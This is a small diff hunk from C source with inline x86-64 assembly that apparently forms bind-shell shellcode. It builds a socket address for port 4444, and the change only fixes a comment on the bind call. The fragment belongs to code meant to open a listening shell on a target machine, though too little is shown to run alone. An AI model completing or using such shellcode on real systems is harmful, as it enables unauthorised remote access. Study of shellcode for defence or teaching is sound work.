@@ -41,7 +41,7 @@ int main()
 	00 02 5C11 00000000 00000000 00000000
 	5c11 => 4444
 	*/
-	// bind(s, struct, $16)
+	// bind(s, struct, 16)
 	"	xchg %rax, %rdi		\n"
 	"	push %rdx		\n"
 	"	push $0x5C110200	\n"
